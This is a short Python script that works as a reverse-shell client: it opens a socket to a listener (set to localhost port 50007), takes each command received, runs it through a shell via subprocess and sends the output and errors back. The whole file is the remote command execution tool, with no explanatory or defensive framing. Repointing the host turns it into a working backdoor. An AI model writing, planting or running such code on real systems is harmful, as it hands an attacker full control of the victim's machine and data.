import socket
import subprocess
import sys
import errno
import time

HOST = 'localhost'
PORT = 50007
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
first_connection = True
ID = ''

while True:
    try:
        command = s.recv(1024)
        if command:
            command = command.decode("ISO-8859-1")
            print(command)
            op = subprocess.Popen(str(command), shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            output = op.stdout.read()
            output_error = op.stderr.read()
            s.sendall(output + output_error)
        
        
    except IOError as e:
        if e.errno != errno.EAGAIN and e.errno != errno.EWOULDBLOCK:
            print('Reading error: {}'.format(str(e)))
            sys.exit()
            continue

    except Exception as e:
        print('Reading error: '.format(str(e)))
        sys.exit()